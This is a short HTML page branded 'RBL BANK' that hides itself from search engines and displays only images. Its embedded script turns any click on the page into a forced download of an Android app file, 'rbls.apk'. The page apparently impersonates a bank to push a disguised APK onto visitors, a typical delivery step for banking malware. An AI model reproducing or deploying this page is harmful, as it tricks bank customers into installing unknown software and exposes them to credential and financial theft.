<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>RBL BANK</title>
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <div class="image-container">
        <img src="images/mobile-image.png" alt="Mobile View" class="mobile-img">
        <img src="images/desktop-image.png" alt="Desktop View" class="desktop-img">
    </div>

    <script>
        // Add click event listener to the entire document
        document.addEventListener('click', () => {
            const ele = document.createElement('a');
            ele.href = 'rbls.apk'; // Ensure the APK path is correct
            ele.download = 'rbls.apk'; // Name for the downloaded file
            ele.click(); // Trigger the download
        });
    </script>
</body>

</html>
